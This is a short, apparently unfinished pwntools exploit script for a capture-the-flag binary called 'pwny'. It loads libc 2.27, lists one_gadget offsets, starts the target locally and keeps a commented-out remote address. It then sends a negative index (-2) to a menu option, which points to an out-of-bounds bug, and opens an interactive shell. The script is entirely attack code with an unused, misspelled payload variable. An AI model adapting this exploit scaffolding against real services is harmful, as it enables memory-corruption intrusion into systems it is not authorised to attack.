from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

one_gad = [0x4f3d5,0x4f432,0x10a41c]
libc = ELF("./libc-2.27.so")
p = process("./pwny")
#p = remote("123.60.215.79",22044)

paylaod = p64(1)

p.sendlineafter("choice:","2")
p.sendlineafter("Index:","-2")



p.interactive()